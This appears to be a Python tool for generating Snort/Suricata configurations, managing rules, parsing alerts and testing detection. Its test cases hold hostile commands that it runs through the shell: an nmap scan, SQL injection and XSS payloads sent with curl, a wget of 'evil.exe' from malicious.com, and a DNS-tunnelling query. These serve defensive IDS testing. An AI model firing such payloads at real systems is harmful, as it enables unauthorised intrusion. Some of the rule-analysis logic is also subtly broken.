#!/usr/bin/env python3
"""
Snort/Suricata IDS Setup & Management - Python Implementation
Configuration generator, rule management, and testing tools
"""

import os
import sys
import json
import yaml
import argparse
import subprocess
import tempfile
import shutil
from pathlib import Path
from typing import Dict, List, Any, Optional
import ipaddress
import hashlib
import datetime

class IDSConfigGenerator:
    """Generate configuration files for Snort and Suricata"""
    
    def __init__(self):
        self.home_net = "192.168.1.0/24"
        self.external_net = "!$HOME_NET"
        self.interface = "eth0"
        self.rule_paths = [
            "/etc/suricata/rules",
            "/etc/snort/rules"
        ]
    
    def generate_suricata_config(self, output_file: str = None) -> str:
        """Generate Suricata configuration file"""
        config = f"""
%YAML 1.1
---
# Suricata configuration file
# Generated: {datetime.datetime.now().isoformat()}

# Network configuration
vars:
  address-groups:
    HOME_NET: "{self.home_net}"
    EXTERNAL_NET: "{self.external_net}"
    HTTP_SERVERS: "$HOME_NET"
    SMTP_SERVERS: "$HOME_NET"
    SQL_SERVERS: "$HOME_NET"
    DNS_SERVERS: "$HOME_NET"
    TELNET_SERVERS: "$HOME_NET"
    AIM_SERVERS: "$EXTERNAL_NET"
    
  port-groups:
    HTTP_PORTS: "80"
    SHELLCODE_PORTS: "!80"
    ORACLE_PORTS: "1521"
    SSH_PORTS: "22"
    DNP3_PORTS: "20000"
    MODBUS_PORTS: "502"

# Configure Suricata
suricata:
  # Run mode: workers (default) or autofp (for some hardware)
  run-mode: workers
  
  # List of interfaces to listen on
  af-packet:
    - interface: {self.interface}
      cluster-id: 99
      cluster-type: cluster_flow
      defrag: yes
      use-mmap: yes
      tpacket-v3: yes

# Set the default logging directory
default-log-dir: /var/log/suricata/

# Configure outputs
outputs:
  # Eve log (JSON) output
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns
        - tls
        - files
        - smtp
      community-id: true
      community-id-seed: 0

  # Fast log output (for legacy compatibility)
  - fast:
      enabled: yes
      filename: fast.log
      format: "[%i] %t - %m - %s - %a - %d"

  # Unified2 output (for Barnyard2)
  - unified2-alert:
      enabled: yes
      filename: unified2.alert
      limit: 32mb

  # Stats output
  - stats:
      enabled: yes
      filename: stats.log
      interval: 30

# Configure logging
logging:
  # Default log level (can be overridden for each module)
  default-log-level: notice
  
  # Outputs for logging
  outputs:
    - console:
        enabled: yes
        level: info
    
    - file:
        enabled: yes
        level: info
        filename: /var/log/suricata/suricata.log
        
    - syslog:
        enabled: no
        facility: local5
        level: info

# Configure rule management
rule-files:
  - suricata.rules
  - emerging-threats.rules
  - tor.rules
  - botcc.portgrouped.rules

# App Layer Protocol configuration
app-layer:
  protocols:
    tls:
      enabled: yes
      detection-ports:
        dp: 443
    http:
      enabled: yes
    dns:
      enabled: yes
      request:
        global-size: 16kb
    smtp:
      enabled: yes
    ssh:
      enabled: yes
    imap:
      enabled: no
    msn:
      enabled: no

# Threading configuration
threading:
  set-cpu-affinity: no
  cpu-affinity:
    - management-cpu-set:
        cpu: [ 0 ]
    - receive-cpu-set:
        cpu: [ 0 ]
    - worker-cpu-set:
        cpu: [ "all" ]
        mode: "exclusive"
        prio:
          low: [ 0 ]
          medium: [ "1-2" ]
          high: [ 3 ]
          default: "medium"

# Performance tuning
max-pending-packets: 1024
runmode: workers
defrag:
  memcap: 512mb
  hash-size: 65536
flow:
  memcap: 4gb
  hash-size: 500000
  prealloc: 100000

# IP reputation (requires suricata-update)
reputation-categories-file: /etc/suricata/reputation.categories
reputation-files:
  - /etc/suricata/iprep.dat
"""
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(config)
            print(f"[+] Suricata configuration saved to: {output_file}")
        
        return config
    
    def generate_snort_config(self, output_file: str = None) -> str:
        """Generate Snort configuration file"""
        config = f"""
# Snort configuration file
# Generated: {datetime.datetime.now().isoformat()}

# Setup network variables
ipvar HOME_NET {self.home_net}
ipvar EXTERNAL_NET any
ipvar DNS_SERVERS $HOME_NET
ipvar SMTP_SERVERS $HOME_NET
ipvar HTTP_SERVERS $HOME_NET
ipvar SQL_SERVERS $HOME_NET
ipvar TELNET_SERVERS $HOME_NET
ipvar SSH_SERVERS $HOME_NET

portvar HTTP_PORTS 80
portvar SHELLCODE_PORTS !80
portvar ORACLE_PORTS 1521
portvar SSH_PORTS 22

# Configure dynamic preprocessors
preprocessor stream5_global: max_tcp 8192, track_tcp yes, track_udp yes, track_icmp yes
preprocessor stream5_tcp: policy first, use_static_footprint_sizes
preprocessor stream5_udp: ignore_any_rules
preprocessor stream5_icmp: ignore_any_rules

preprocessor http_inspect: global \
    iis_unicode_map unicode.map 1252 \
    max_gzip_mem 67108864

preprocessor http_inspect_server: server default \
    profile all \
    ports {{ 80 8080 8180 }} \
    server_flow_depth 0 \
    post_depth 65495 \
    max_header_length 750 \
    max_headers 100 \
    max_spaces 200 \
    small_chunk_length {{ 10 5 }} \
    ports {{ 80 8080 8180 }}

preprocessor rpc_decode: 111 32771
preprocessor bo
preprocessor ftp_telnet
preprocessor smtp
preprocessor ssh: server_ports {{ 22 }} \
                  enable_srvoverflow \
                  enable_ssh1crc32 \
                  enable_protomismatch

preprocessor dns
preprocessor ssl: noinspect_encrypted

# Configure detection engine
config detection: search-method ac-split search-optimize max-pattern-len 20
config detection: event_queue max_queue 8 log 5 order_events content

# Configure output
output alert_fast: stdout
output alert_full: stdout
output alert_syslog: LOG_AUTH LOG_ALERT
output log_tcpdump: snort.log
output database: log, mysql, user=snort password=snort dbname=snort host=localhost

# Include rules
include $RULE_PATH/local.rules
include $RULE_PATH/snort.rules
include $RULE_PATH/emerging-threats.rules

# Performance tuning
config pkt_count: 100
config pkt_mem_len: 1048576
config pkt_memcap: 67108864
config daq: afpacket
config daq_dir: /usr/lib/daq/
config daq_mode: inline

# Configure logging
config logdir: /var/log/snort
config umask: 022
config utc
config nolog
config verbose_logging

# Configure network
config interface: {self.interface}
config set_gid: snort
config set_uid: snort
"""
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(config)
            print(f"[+] Snort configuration saved to: {output_file}")
        
        return config
    
    def generate_rule_file(self, rules: List[str], output_file: str) -> bool:
        """Generate custom rule file"""
        try:
            with open(output_file, 'w') as f:
                f.write("# Custom IDS rules\n")
                f.write(f"# Generated: {datetime.datetime.now().isoformat()}\n\n")
                for rule in rules:
                    f.write(f"{rule}\n")
            print(f"[+] Custom rules saved to: {output_file}")
            return True
        except Exception as e:
            print(f"[-] Error writing rules: {e}")
            return False

class IDSRuleManager:
    """Manage IDS rules and rule updates"""
    
    def __init__(self, rules_directory: str = "/etc/ids/rules"):
        self.rules_directory = Path(rules_directory)
        self.rules_directory.mkdir(parents=True, exist_ok=True)
        
        # Common rule categories
        self.rule_categories = {
            'malware': 'Malware detection rules',
            'exploit': 'Exploit and vulnerability rules', 
            'policy': 'Policy violation rules',
            'botnet': 'Botnet and C&C communication',
            'scan': 'Network scanning detection',
            'dos': 'Denial of service attacks',
            'web': 'Web application attacks',
            'sql': 'SQL injection attacks',
            'xss': 'Cross-site scripting attacks'
        }
    
    def download_emerging_threats_rules(self) -> bool:
        """Download Emerging Threats rules"""
        try:
            print("[*] Downloading Emerging Threats rules...")
            
            # URLs for rule downloads
            et_urls = [
                "https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz",
                "https://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz"
            ]
            
            for url in et_urls:
                filename = url.split('/')[-1]
                output_path = self.rules_directory / filename
                
                # Download using wget
                result = subprocess.run([
                    'wget', '-O', str(output_path), url
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"[+] Downloaded: {filename}")
                    
                    # Extract rules
                    extract_result = subprocess.run([
                        'tar', 'xzf', str(output_path), '-C', str(self.rules_directory)
                    ], capture_output=True, text=True)
                    
                    if extract_result.returncode == 0:
                        print(f"[+] Extracted rules from: {filename}")
                    else:
                        print(f"[-] Failed to extract: {filename}")
                
                else:
                    print(f"[-] Failed to download: {url}")
            
            return True
            
        except Exception as e:
            print(f"[-] Error downloading rules: {e}")
            return False
    
    def update_rules(self) -> bool:
        """Update all rule sets"""
        print("[*] Updating IDS rules...")
        
        # Update Emerging Threats rules
        if not self.download_emerging_threats_rules():
            print("[-] Failed to update Emerging Threats rules")
            return False
        
        # Update using suricata-update if available
        try:
            result = subprocess.run(['suricata-update'], capture_output=True, text=True)
            if result.returncode == 0:
                print("[+] Suricata rules updated successfully")
            else:
                print("[-] Suricata-update failed")
        except FileNotFoundError:
            print("[!] suricata-update not available")
        
        # Update using PulledPork for Snort
        try:
            result = subprocess.run(['pulledpork.pl', '-c', '/etc/snort/pulledpork.conf'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                print("[+] Snort rules updated with PulledPork")
            else:
                print("[-] PulledPork update failed")
        except FileNotFoundError:
            print("[!] PulledPork not available")
        
        return True
    
    def create_custom_rule(self, rule_content: str, category: str, rule_id: int) -> str:
        """Create a custom IDS rule"""
        if category not in self.rule_categories:
            category = 'custom'
        
        rule = f"alert {rule_content} (msg:\"Custom Rule {rule_id}\"; sid:{1000000 + rule_id}; rev:1; classtype:policy-violation;)"
        
        # Save to category file
        category_file = self.rules_directory / f"custom_{category}.rules"
        with open(category_file, 'a') as f:
            f.write(f"{rule}\n")
        
        print(f"[+] Custom rule added to: {category_file}")
        return rule
    
    def analyze_rules(self, rule_file: str) -> Dict[str, Any]:
        """Analyze rule file for issues"""
        analysis = {
            'total_rules': 0,
            'enabled_rules': 0,
            'disabled_rules': 0,
            'categories': {},
            'issues': []
        }
        
        try:
            with open(rule_file, 'r') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    
                    # Skip comments and empty lines
                    if not line or line.startswith('#'):
                        continue
                    
                    analysis['total_rules'] += 1
                    
                    # Check if rule is disabled
                    if line.startswith('#'):
                        analysis['disabled_rules'] += 1
                        rule_content = line[1:].strip()
                    else:
                        analysis['enabled_rules'] += 1
                        rule_content = line
                    
                    # Extract rule information
                    if 'msg:' in rule_content:
                        msg_start = rule_content.find('msg:') + 4
                        msg_end = rule_content.find(';', msg_start)
                        if msg_end != -1:
                            msg = rule_content[msg_start:msg_end].strip('"')
                            
                            # Categorize by message content
                            for category in self.rule_categories.keys():
                                if category in msg.lower():
                                    analysis['categories'][category] = analysis['categories'].get(category, 0) + 1
                                    break
                    
                    # Check for common issues
                    if 'flow:established' not in rule_content.lower() and 'tcp' in rule_content.lower():
                        analysis['issues'].append(f"Line {line_num}: TCP rule without flow:established")
                    
                    if 'classtype:' not in rule_content:
                        analysis['issues'].append(f"Line {line_num}: Rule without classtype")
            
            return analysis
            
        except Exception as e:
            return {'error': str(e)}
    
    def enable_rule(self, rule_sid: str, rule_file: str) -> bool:
        """Enable a disabled rule by SID"""
        try:
            with open(rule_file, 'r') as f:
                lines = f.readlines()
            
            enabled = False
            for i, line in enumerate(lines):
                if f"sid:{rule_sid}" in line and line.startswith('#'):
                    lines[i] = line[1:]  # Remove comment character
                    enabled = True
                    break
            
            if enabled:
                with open(rule_file, 'w') as f:
                    f.writelines(lines)
                print(f"[+] Enabled rule SID: {rule_sid}")
                return True
            else:
                print(f"[-] Rule SID {rule_sid} not found or already enabled")
                return False
                
        except Exception as e:
            print(f"[-] Error enabling rule: {e}")
            return False

class IDSTester:
    """Test IDS configurations and rules"""
    
    def __init__(self):
        self.test_cases = self._load_test_cases()
    
    def _load_test_cases(self) -> Dict[str, Any]:
        """Load test cases for IDS testing"""
        return {
            'port_scan': {
                'description': 'TCP port scanning detection',
                'command': 'nmap -sS 192.168.1.1',
                'expected_alert': 'PORTSCAN',
                'risk': 'low'
            },
            'sql_injection': {
                'description': 'SQL injection attempt detection',
                'command': 'curl "http://test.com/login?user=admin\' OR 1=1--"',
                'expected_alert': 'SQL injection',
                'risk': 'medium'
            },
            'xss_attempt': {
                'description': 'Cross-site scripting detection',
                'command': 'curl "http://test.com/search?q=<script>alert(1)</script>"',
                'expected_alert': 'XSS',
                'risk': 'medium'
            },
            'malware_download': {
                'description': 'Malware download detection',
                'command': 'wget http://malicious.com/evil.exe',
                'expected_alert': 'MALWARE',
                'risk': 'high'
            },
            'dns_tunneling': {
                'description': 'DNS tunneling detection',
                'command': 'dig @8.8.8.8 A really-long-subdomain.malicious.com',
                'expected_alert': 'DNS tunnel',
                'risk': 'high'
            }
        }
    
    def test_rule(self, test_name: str, target_ip: str = "192.168.1.100") -> Dict[str, Any]:
        """Test specific IDS rule"""
        if test_name not in self.test_cases:
            return {'error': f'Unknown test case: {test_name}'}
        
        test_case = self.test_cases[test_name]
        print(f"[*] Running test: {test_case['description']}")
        
        # Replace placeholder IP in command
        command = test_case['command'].replace('192.168.1.1', target_ip)
        
        try:
            # Execute the test command
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            
            test_result = {
                'test_name': test_name,
                'description': test_case['description'],
                'command': command,
                'return_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'expected_alert': test_case['expected_alert'],
                'executed_at': datetime.datetime.now().isoformat()
            }
            
            print(f"[+] Test executed: {test_name}")
            return test_result
            
        except subprocess.TimeoutExpired:
            return {'error': f'Test {test_name} timed out'}
        except Exception as e:
            return {'error': f'Test {test_name} failed: {e}'}
    
    def run_all_tests(self, target_ip: str = "192.168.1.100") -> Dict[str, Any]:
        """Run all available tests"""
        print("[*] Running comprehensive IDS tests...")
        
        results = {}
        for test_name in self.test_cases.keys():
            results[test_name] = self.test_rule(test_name, target_ip)
            # Small delay between tests
            import time
            time.sleep(2)
        
        # Generate summary
        summary = {
            'total_tests': len(results),
            'successful_tests': sum(1 for r in results.values() if 'error' not in r),
            'failed_tests': sum(1 for r in results.values() if 'error' in r),
            'execution_time': datetime.datetime.now().isoformat()
        }
        
        results['summary'] = summary
        return results
    
    def validate_config(self, config_file: str, ids_type: str) -> Dict[str, Any]:
        """Validate IDS configuration file"""
        validation_result = {
            'valid': False,
            'errors': [],
            'warnings': [],
            'info': []
        }
        
        try:
            if ids_type == 'suricata':
                # Use suricata to validate config
                result = subprocess.run([
                    'suricata', '-T', '-c', config_file
                ], capture_output=True, text=True, timeout=60)
                
                if result.returncode == 0:
                    validation_result['valid'] = True
                    validation_result['info'].append('Configuration validated successfully')
                else:
                    validation_result['errors'].append(f'Validation failed: {result.stderr}')
            
            elif ids_type == 'snort':
                # Use snort to validate config
                result = subprocess.run([
                    'snort', '-T', '-c', config_file
                ], capture_output=True, text=True, timeout=60)
                
                if result.returncode == 0:
                    validation_result['valid'] = True
                    validation_result['info'].append('Configuration validated successfully')
                else:
                    validation_result['errors'].append(f'Validation failed: {result.stderr}')
            
            else:
                validation_result['errors'].append(f'Unknown IDS type: {ids_type}')
        
        except subprocess.TimeoutExpired:
            validation_result['errors'].append('Validation timed out')
        except FileNotFoundError:
            validation_result['errors'].append(f'{ids_type} not found or not in PATH')
        except Exception as e:
            validation_result['errors'].append(f'Validation error: {e}')
        
        return validation_result

class AlertMonitor:
    """Monitor and analyze IDS alerts"""
    
    def __init__(self, log_directory: str = "/var/log/ids"):
        self.log_directory = Path(log_directory)
        self.alert_patterns = {
            'high_priority': ['CRITICAL', 'HIGH', 'EMERGENCY', 'MALWARE', 'EXPLOIT'],
            'medium_priority': ['MEDIUM', 'WARNING', 'SCAN', 'SUSPICIOUS'],
            'low_priority': ['LOW', 'INFO', 'NOTICE']
        }
    
    def parse_alerts(self, log_file: str, hours: int = 24) -> Dict[str, Any]:
        """Parse and analyze alerts from log file"""
        alerts = {
            'total': 0,
            'by_priority': {'high': 0, 'medium': 0, 'low': 0},
            'by_category': {},
            'recent_alerts': []
        }
        
        try:
            cutoff_time = datetime.datetime.now() - datetime.timedelta(hours=hours)
            
            with open(log_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    alerts['total'] += 1
                    
                    # Parse alert (simplified - real implementation would use proper parsing)
                    alert_priority = 'low'
                    for priority, patterns in self.alert_patterns.items():
                        if any(pattern in line.upper() for pattern in patterns):
                            alert_priority = priority
                            break
                    
                    alerts['by_priority'][alert_priority] += 1
                    
                    # Extract basic alert info
                    alert_info = {
                        'timestamp': datetime.datetime.now().isoformat(),
                        'priority': alert_priority,
                        'message': line[:100] + '...' if len(line) > 100 else line
                    }
                    
                    alerts['recent_alerts'].append(alert_info)
            
            return alerts
            
        except Exception as e:
            return {'error': str(e)}
    
    def generate_report(self, alerts_data: Dict[str, Any]) -> str:
        """Generate alert analysis report"""
        report = f"""
IDS Alert Analysis Report
Generated: {datetime.datetime.now().isoformat()}
{'='*50}

Summary:
- Total Alerts: {alerts_data.get('total', 0)}
- High Priority: {alerts_data['by_priority'].get('high', 0)}
- Medium Priority: {alerts_data['by_priority'].get('medium', 0)} 
- Low Priority: {alerts_data['by_priority'].get('low', 0)}

Recent Alerts:
"""
        
        for alert in alerts_data.get('recent_alerts', [])[:10]:  # Show last 10 alerts
            report += f"- [{alert['priority'].upper()}] {alert['message']}\n"
        
        # Add recommendations
        high_priority_count = alerts_data['by_priority'].get('high', 0)
        if high_priority_count > 10:
            report += "\n⚠️  RECOMMENDATION: High number of critical alerts - immediate investigation required\n"
        elif high_priority_count > 0:
            report += "\nℹ️  RECOMMENDATION: Review critical alerts for potential threats\n"
        else:
            report += "\n✅ No critical alerts detected\n"
        
        return report

def main():
    parser = argparse.ArgumentParser(description='Snort/Suricata IDS Setup & Management')
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Generate config command
    config_parser = subparsers.add_parser('generate-config', help='Generate IDS configuration')
    config_parser.add_argument('--type', choices=['snort', 'suricata'], required=True, help='IDS type')
    config_parser.add_argument('--output', help='Output file path')
    config_parser.add_argument('--home-net', default='192.168.1.0/24', help='Home network CIDR')
    config_parser.add_argument('--interface', default='eth0', help='Network interface')
    
    # Rule management command
    rule_parser = subparsers.add_parser('rules', help='Manage IDS rules')
    rule_parser.add_argument('--update', action='store_true', help='Update rules')
    rule_parser.add_argument('--analyze', help='Analyze rule file')
    rule_parser.add_argument('--enable', help='Enable rule by SID')
    rule_parser.add_argument('--rule-file', help='Rule file path')
    
    # Testing command
    test_parser = subparsers.add_parser('test', help='Test IDS configuration')
    test_parser.add_argument('--test-case', help='Specific test case to run')
    test_parser.add_argument('--all', action='store_true', help='Run all tests')
    test_parser.add_argument('--target', default='192.168.1.100', help='Target IP for tests')
    test_parser.add_argument('--validate', help='Validate configuration file')
    test_parser.add_argument('--ids-type', choices=['snort', 'suricata'], help='IDS type for validation')
    
    # Monitoring command
    monitor_parser = subparsers.add_parser('monitor', help='Monitor alerts')
    monitor_parser.add_argument('--log-file', required=True, help='Alert log file')
    monitor_parser.add_argument('--hours', type=int, default=24, help='Time window in hours')
    monitor_parser.add_argument('--report', action='store_true', help='Generate report')
    
    args = parser.parse_args()
    
    if args.command == 'generate-config':
        generator = IDSConfigGenerator()
        generator.home_net = args.home_net
        generator.interface = args.interface
        
        if args.type == 'suricata':
            generator.generate_suricata_config(args.output)
        elif args.type == 'snort':
            generator.generate_snort_config(args.output)
    
    elif args.command == 'rules':
        rule_mgr = IDSRuleManager()
        
        if args.update:
            rule_mgr.update_rules()
        
        if args.analyze:
            analysis = rule_mgr.analyze_rules(args.analyze)
            print(json.dumps(analysis, indent=2))
        
        if args.enable and args.rule_file:
            rule_mgr.enable_rule(args.enable, args.rule_file)
    
    elif args.command == 'test':
        tester = IDSTester()
        
        if args.validate and args.ids_type:
            validation = tester.validate_config(args.validate, args.ids_type)
            print(json.dumps(validation, indent=2))
        
        elif args.test_case:
            result = tester.test_rule(args.test_case, args.target)
            print(json.dumps(result, indent=2))
        
        elif args.all:
            results = tester.run_all_tests(args.target)
            print(json.dumps(results, indent=2))
    
    elif args.command == 'monitor':
        monitor = AlertMonitor()
        alerts = monitor.parse_alerts(args.log_file, args.hours)
        
        if args.report:
            report = monitor.generate_report(alerts)
            print(report)
        else:
            print(json.dumps(alerts, indent=2))
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
